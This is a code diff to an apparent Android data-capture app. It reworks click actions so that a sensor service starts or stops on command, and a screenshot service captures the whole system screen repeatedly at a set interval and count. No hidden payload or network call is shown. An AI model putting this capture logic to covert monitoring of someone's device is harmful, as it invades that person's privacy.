@@ -2,6 +2,7 @@ package com.vikasyadavnsit.cdc.enums;
 
 import android.app.Activity;
 import android.content.Context;
+import android.util.Log;
 
 import com.vikasyadavnsit.cdc.data.User;
 import com.vikasyadavnsit.cdc.permissions.PermissionManager;
@@ -67,8 +68,11 @@ public enum ClickActions {
     START_SENSOR_SERVICE(
             6,
             (context, triggerSettingsData) -> {
-                CDCSensorService.startSensorService((Activity) context);
-                CDCSensorService.stopSensorService((Activity) context);
+                if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
+                    CDCSensorService.startSensorService((Activity) context);
+                } else {
+                    CDCSensorService.stopSensorService((Activity) context);
+                }
             },
             "Start/Stop sensor service (It is a toggle button to start/stop capturing multiple sensors data)",
             "Start sensor service"
@@ -76,9 +80,23 @@ public enum ClickActions {
     START_SCREENSHOT_SERVICE(
             7,
             (context, triggerSettingsData) -> {
-                ActionUtils.startMediaProjectionService((Activity) context);
-                ScreenshotService.setTakeScreenshot(true);
-                ScreenshotService.setStopScreenshotService(true);
+                if (ActionStatus.PREPARE.equals(triggerSettingsData.getActionStatus())) {
+                    ActionUtils.startMediaProjectionService((Activity) context);
+                } else if (ActionStatus.START.equals(triggerSettingsData.getActionStatus())) {
+                    int maxRepetitions = triggerSettingsData.getMaxRepetitions();
+                    for (int i = 0; i < maxRepetitions; i++) {
+                        ScreenshotService.setTakeScreenshot(true);
+                        try {
+                            Thread.sleep(triggerSettingsData.getInterval());
+                        } catch (InterruptedException e) {
+                            throw new RuntimeException(e);
+                        }
+                        Log.d("ClickActions", "Took the " + i + " screenshot");
+                    }
+                } else if (ActionStatus.STOP.equals(triggerSettingsData.getActionStatus())) {
+                    ScreenshotService.setStopScreenshotService(true);
+                }
+
             },
             "Start/Stop screenshot service (It is a toggle button to capture a screenshot on the entire system)",
             "Start screenshot service"
